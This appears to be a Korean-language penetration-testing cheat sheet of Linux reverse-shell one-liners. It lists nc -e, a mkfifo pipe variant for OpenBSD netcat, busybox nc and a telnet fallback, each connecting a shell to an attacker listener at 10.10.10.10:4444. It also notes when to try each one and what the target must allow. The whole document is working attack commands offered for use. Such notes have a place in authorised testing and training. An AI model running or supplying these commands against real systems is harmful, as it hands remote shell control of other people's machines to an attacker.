# linux netcat reverse shell

- nc로 셸을 리스너에 붙이는 리버스 셸 변형 모음(-e 지원 nc·ncat, mkfifo 파이프 방식의 OpenBSD nc, busybox nc, telnet 대안)
- 타깃에 nc·busybox·telnet이 설치돼 있는 것을 확인했을 때 bash /dev/tcp 다음으로 시도한다
- 타깃에 해당 바이너리 존재, `-e` 지원 여부를 nc -h로 먼저 확인(우분투 기본 OpenBSD nc는 미지원), 공격자 리스너 사전 실행과 TCP 아웃바운드 허용 필요

nc가 있을 때. `-e` 지원 여부로 방법이 갈린다 (`nc -h` 출력에 `-e` 확인).

```bash
# -e 지원 (traditional nc, ncat)
nc -e /bin/sh 10.10.10.10 4444

# -e 미지원 (Ubuntu 등 OpenBSD nc가 기본) — mkfifo 파이프
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.10.10.10 4444 >/tmp/f

# busybox가 있는 임베디드·라우터
busybox nc 10.10.10.10 4444 -e sh

# nc가 없고 telnet만 있을 때
TF=$(mktemp -u); mkfifo $TF && telnet 10.10.10.10 4444 0<$TF | sh 1>$TF
```
